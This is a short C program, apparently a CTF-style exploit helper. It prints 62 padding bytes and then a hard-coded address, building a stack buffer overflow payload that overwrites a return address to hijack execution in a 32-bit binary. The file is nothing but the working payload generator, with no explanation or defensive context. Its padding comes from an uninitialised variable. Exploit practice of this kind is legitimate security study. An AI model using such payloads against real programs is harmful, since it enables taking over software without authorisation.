#include <stdio.h>
#include <stdint.h>

int main(){
  int pad = 0x3e;
  uintptr_t addr = 0x08048665;
  
  for (int i=0; i< pad; i++){
    char dummy;
    fwrite(&dummy, 1,1,stdout);
  }
  fwrite(&addr, 1 , sizeof(uintptr_t),stdout);

  return 0;
}
